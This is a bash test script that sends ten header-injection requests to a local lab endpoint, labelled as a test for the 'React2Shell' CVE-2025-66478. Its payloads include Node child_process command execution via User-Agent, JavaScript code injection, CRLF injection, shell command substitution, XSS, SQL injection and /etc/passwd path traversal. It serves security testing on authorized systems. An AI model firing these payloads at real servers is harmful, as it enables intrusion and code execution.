#!/bin/bash

# React2Shell Vulnerability Test - Header Injection
# Test script for CVE-2025-66478
# WARNING: For testing purposes only on authorized systems!

BASE_URL="http://localhost:3000"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}React2Shell - Header Injection Tests${NC}"
echo -e "${BLUE}========================================${NC}\n"

# Test 1: Normal Headers
echo -e "${YELLOW}[TEST 1] Normal Custom Header${NC}"
curl -s -H "X-Custom-Header: normal value" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test1.html
echo "✓ Request completed"
echo ""

# Test 2: Malicious User-Agent
echo -e "${YELLOW}[TEST 2] Malicious User-Agent${NC}"
PAYLOAD="'); require('child_process').exec('whoami'); //"
echo "Payload: $PAYLOAD"
curl -s -H "User-Agent: ${PAYLOAD}" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test2.html
echo "✓ Malicious User-Agent sent"
echo ""

# Test 3: Custom Header with Code
echo -e "${YELLOW}[TEST 3] Custom Header with Code Injection${NC}"
PAYLOAD="'); console.log('PWNED'); //"
echo "Payload: $PAYLOAD"
curl -s -H "X-Custom-Header: ${PAYLOAD}" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test3.html
echo "✓ Code injection via custom header"
echo ""

# Test 4: CRLF Injection
echo -e "${YELLOW}[TEST 4] CRLF Injection${NC}"
curl -s -H $'X-Custom-Header: value\r\nX-Injected: malicious' \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test4.html
echo "✓ CRLF injection attempt"
echo ""

# Test 5: Command Substitution
echo -e "${YELLOW}[TEST 5] Command Substitution in Header${NC}"
curl -s -H "X-Custom-Header: \$(whoami)" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test5.html
echo "✓ Command substitution attempt"
echo ""

# Test 6: Multiple Malicious Headers
echo -e "${YELLOW}[TEST 6] Multiple Malicious Headers${NC}"
curl -s \
  -H "X-Custom-Header: '); console.log('h1'); //" \
  -H "X-Another-Header: '); console.log('h2'); //" \
  -H "User-Agent: '); console.log('ua'); //" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test6.html
echo "✓ Multiple header injection"
echo ""

# Test 7: XSS via Referer
echo -e "${YELLOW}[TEST 7] XSS via Referer Header${NC}"
curl -s -H "Referer: <script>alert('XSS')</script>" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test7.html
echo "✓ XSS via Referer"
echo ""

# Test 8: SQL Injection Pattern in Header
echo -e "${YELLOW}[TEST 8] SQL Injection Pattern${NC}"
curl -s -H "X-Custom-Header: ' OR '1'='1" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test8.html
echo "✓ SQL injection pattern"
echo ""

# Test 9: Path Traversal in Header
echo -e "${YELLOW}[TEST 9] Path Traversal${NC}"
curl -s -H "X-Custom-Header: ../../../etc/passwd" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test9.html
echo "✓ Path traversal attempt"
echo ""

# Test 10: Cookie Injection
echo -e "${YELLOW}[TEST 10] Cookie Header Manipulation${NC}"
curl -s -H "Cookie: session='); console.log('cookie-inject'); //'" \
  "${BASE_URL}/vulnerable/header-injection" > /tmp/header-test10.html
echo "✓ Cookie injection"
echo ""

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Header Injection Tests Completed${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "\n${YELLOW}Check /tmp/header-test*.html files for results${NC}"
echo -e "${YELLOW}Check server console for any code execution${NC}\n"
